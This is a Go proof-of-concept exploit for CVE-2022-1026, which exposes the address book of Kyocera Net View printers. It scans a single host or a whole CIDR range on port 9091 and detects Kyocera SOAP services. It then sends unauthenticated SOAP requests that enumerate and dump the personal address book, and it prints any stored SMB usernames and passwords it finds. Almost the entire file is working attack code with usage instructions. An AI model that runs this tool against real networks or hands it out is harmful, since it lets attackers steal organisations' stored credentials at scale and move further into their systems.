// quick & dirty improved golang version of https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/
// credits to Aaron Herndon / https://twitter.com/ac3lives
// poc for CVE-2022-1026
// usage:
// go build kygocera.go
// ./kygocera <IP / URL / IP-Range)
// e.g.
// ./kygocera 192.168.0.0/24
// ./kygocera printer.mynetwork.local
// ./kygocera 127.0.0.1 -p 9091 -t 200
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/xml"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

type Envelope struct {
	XMLName xml.Name `xml:"Envelope"`
	Text    string   `xml:",chardata"`
	Header  struct {
		Text   string `xml:",chardata"`
		Action string `xml:"Action"`
	} `xml:"Header"`
	Body struct {
		Text                                     string `xml:",chardata"`
		Space                                    string `xml:"space,attr"`
		CreatePersonalAddressEnumerationResponse struct {
			Text        string `xml:",chardata"`
			Result      string `xml:"result"`
			Enumeration string `xml:"enumeration"`
		} `xml:"create_personal_address_enumerationResponse"`
	} `xml:"Body"`
}

type Envelope2 struct {
	XMLName          xml.Name `xml:"Envelope"`
	Text             string   `xml:",chardata"`
	SOAPENV          string   `xml:"SOAP-ENV,attr"`
	SOAPENC          string   `xml:"SOAP-ENC,attr"`
	Xsi              string   `xml:"xsi,attr"`
	Xsd              string   `xml:"xsd,attr"`
	C14n             string   `xml:"c14n,attr"`
	Wsu              string   `xml:"wsu,attr"`
	Xenc             string   `xml:"xenc,attr"`
	Ds               string   `xml:"ds,attr"`
	Wsse             string   `xml:"wsse,attr"`
	Discovery        string   `xml:"discovery,attr"`
	Eventing         string   `xml:"eventing,attr"`
	Addressing       string   `xml:"addressing,attr"`
	Kmauth           string   `xml:"kmauth,attr"`
	Wsdd             string   `xml:"wsdd,attr"`
	Wsa5             string   `xml:"wsa5,attr"`
	Xop              string   `xml:"xop,attr"`
	Kmaccmgt         string   `xml:"kmaccmgt,attr"`
	Kmaddrbook       string   `xml:"kmaddrbook,attr"`
	Kmauthset        string   `xml:"kmauthset,attr"`
	Kmboxinfo        string   `xml:"kmboxinfo,attr"`
	Kmcntinfo        string   `xml:"kmcntinfo,attr"`
	Kmdevset         string   `xml:"kmdevset,attr"`
	Kmjobmng         string   `xml:"kmjobmng,attr"`
	Kmloginfo        string   `xml:"kmloginfo,attr"`
	Kmpanelset       string   `xml:"kmpanelset,attr"`
	Kmstored         string   `xml:"kmstored,attr"`
	Kmscn            string   `xml:"kmscn,attr"`
	Kmuserlist       string   `xml:"kmuserlist,attr"`
	Kmdevinfo        string   `xml:"kmdevinfo,attr"`
	Kmdevctrl        string   `xml:"kmdevctrl,attr"`
	Kmfaxset         string   `xml:"kmfaxset,attr"`
	Kmdevstts        string   `xml:"kmdevstts,attr"`
	Kmhypasmgt       string   `xml:"kmhypasmgt,attr"`
	Kmcertmgt        string   `xml:"kmcertmgt,attr"`
	Kmfirmwareupdate string   `xml:"kmfirmwareupdate,attr"`
	Kmmaint          string   `xml:"kmmaint,attr"`
	Header           struct {
		Text   string `xml:",chardata"`
		Action string `xml:"Action"`
	} `xml:"Header"`
	Body struct {
		Text                           string `xml:",chardata"`
		Space                          string `xml:"space,attr"`
		GetPersonalAddressListResponse struct {
			Text            string `xml:",chardata"`
			Result          string `xml:"result"`
			PersonalAddress []struct {
				Text            string `xml:",chardata"`
				NameInformation struct {
					Text     string `xml:",chardata"`
					Name     string `xml:"name"`
					Furigana string `xml:"furigana"`
					ID       string `xml:"id"`
				} `xml:"name_information"`
				EmailInformation struct {
					Text    string `xml:",chardata"`
					Address string `xml:"address"`
				} `xml:"email_information"`
				FtpInformation struct {
					Text       string `xml:",chardata"`
					ServerName string `xml:"server_name"`
					PortNumber string `xml:"port_number"`
				} `xml:"ftp_information"`
				SmbInformation struct {
					Text          string `xml:",chardata"`
					ServerName    string `xml:"server_name"`
					FilePath      string `xml:"file_path"`
					PortNumber    string `xml:"port_number"`
					LoginName     string `xml:"login_name"`
					LoginPassword string `xml:"login_password"`
				} `xml:"smb_information"`
				FaxInformation struct {
					Text                    string `xml:",chardata"`
					FaxNumber               string `xml:"fax_number"`
					ConnectionBeginingSpeed string `xml:"connection_begining_speed"`
					Ecm                     string `xml:"ecm"`
					CodeKeyID               string `xml:"code_key_id"`
					CodeSendSetting         string `xml:"code_send_setting"`
					CodeBoxNumber           string `xml:"code_box_number"`
					CodeBoxSetting          string `xml:"code_box_setting"`
				} `xml:"fax_information"`
			} `xml:"personal_address"`
		} `xml:"get_personal_address_listResponse"`
	} `xml:"Body"`
}

func main() {
	if len(os.Args) < 2 {
		fmt.Printf("[!] no IP or URL found\nusage: kygocera <IP/URL>\n")
		os.Exit(1)
	}

	timeoutPtr := flag.Int("t", 500, "timeout limit in milliseconds")
	urlPtr := flag.String("u", "", "target: ip, url, cidr")
	portPtr := flag.String("p", "9091", "port")
	nosslPtr := flag.Bool("n", false, "ssl off")
	flag.Parse()

	var hosts []string

	// check, if command-line argument for host is an ip-adress
	// if not, it should be an url. then try to resolve
	// if not able to resolve, look for / in it, then its maybe a range
	// if error in parsing cidr -> gtfo
	host := net.ParseIP(*urlPtr)
	if host != nil {
		hosts = append(hosts, *urlPtr)
	} else {
		addr, err := net.LookupHost(*urlPtr)
		if err == nil {
			hosts = append(hosts, addr[0])
		} else {
			hosts, err = getHostsFromNetwork(*urlPtr)
			if err != nil {
				log.Fatalf("[!] something is wrong with '%s'\n", *urlPtr)
			}
		}
	}

	banner()
	for _, host := range hosts {
		target := host + ":" + *portPtr
		fmt.Printf("[*] trying %s...", target)
		// check if port is open on target, then attack
		conn, err := net.DialTimeout("tcp", target, time.Duration(*timeoutPtr)*time.Millisecond)
		if err == nil {
			fmt.Printf("open! checking...")
			conn.Close()
			isKyocera, err := checkKyoceraHTTP(target, *nosslPtr)
			if err != nil {
				fmt.Printf("error! %s\n", err)
			}
			if isKyocera {
				fmt.Printf("ok! trying...")
				id, err := createAddressBookObject(target, *nosslPtr)
				if err != nil {
					fmt.Printf("failure\n")
					//			fmt.Printf("[-] %s error: %s\n", target, err)
				} else {
					fmt.Printf("success! (id #%s)\n", id)
					getAddressBookObject(target, id, *nosslPtr)
				}
			} else {
				fmt.Printf("no kyocera\n")
			}

		} else {
			fmt.Printf("nope\n")
		}
	}

}

func checkKyoceraHTTP(target string, nossl bool) (bool, error) {
	if nossl {
		target = "http://" + target
	} else {
		target = "https://" + target
	}
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get(target)
	if err != nil {
		fmt.Println("\n[DEBUG] error : \n", err)
		return false, err
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	bodyString := string(bodyBytes)
	if strings.Contains(bodyString, "<SOAP-ENV:Envelope>") {
		resp.Body.Close()
		//	fmt.Printf("\n[DEBUG] body: %s\n", bodyString)
		return true, nil
	}
	return false, err
}

func createAddressBookObject(target string, nossl bool) (id string, err error) {
	if nossl {
		target = "http://" + target
	} else {
		target = "https://" + target
	}

	url := fmt.Sprintf(target + "/ws/km-wsdl/setting/address_book")
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := http.Client{}
	reqBody := []byte(`<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>}`)
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer(reqBody))
	if err != nil {
		return "", fmt.Errorf("could not create request: %s\n", err)
	}
	req.Header.Set("content-type", "application/soap+xml")
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error requesting new addressbook object: %s\n", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("error reading response body: %s\n", err)
	}

	var envelope Envelope
	xml.Unmarshal(bodyBytes, &envelope)

	if envelope.Body.CreatePersonalAddressEnumerationResponse.Result == "SUCCESS" {
		return envelope.Body.CreatePersonalAddressEnumerationResponse.Enumeration, nil
	} else {
		return "", fmt.Errorf("unable to create addressbook object")
	}

}

func getAddressBookObject(target, id string, nossl bool) {
	if nossl {
		target = "http://" + target
	} else {
		target = "https://" + target
	}

	url := fmt.Sprintf(target + "/ws/km-wsdl/setting/address_book")

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := http.Client{}
	reqBody := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>%s</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>`, id)
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer([]byte(reqBody)))
	if err != nil {
		log.Fatalf("[!] could not create request: %s\n", err)
	}
	req.Header.Set("content-type", "application/soap+xml")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("[!] error making post request: %s\n", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("[!] error reading response body: %s\n", err)
	}

	var envelope2 Envelope2
	xml.Unmarshal(bodyBytes, &envelope2)

	for i := 0; i < len(envelope2.Body.GetPersonalAddressListResponse.PersonalAddress); i++ {
		if envelope2.Body.GetPersonalAddressListResponse.PersonalAddress[i].SmbInformation.LoginName != "" && envelope2.Body.GetPersonalAddressListResponse.PersonalAddress[i].SmbInformation.LoginPassword != "" {
			fmt.Printf("[%s] smbUsername: %s\n", target, envelope2.Body.GetPersonalAddressListResponse.PersonalAddress[i].SmbInformation.LoginName)
			fmt.Printf("[%s] smbPassword: %s\n", target, envelope2.Body.GetPersonalAddressListResponse.PersonalAddress[i].SmbInformation.LoginPassword)
		}
	}

}

func getHostsFromNetwork(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, ip.String())
	}

	// remove network address and broadcast address
	lenIPs := len(ips)
	switch {
	case lenIPs < 2:
		return ips, nil

	default:
		return ips[1 : len(ips)-1], nil
	}
}

// incremental function for getHostsFromnetwork
func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func banner() {
	fmt.Println("# CVE-2022-1026: Kyocera Net View Address Book Exposure")
}
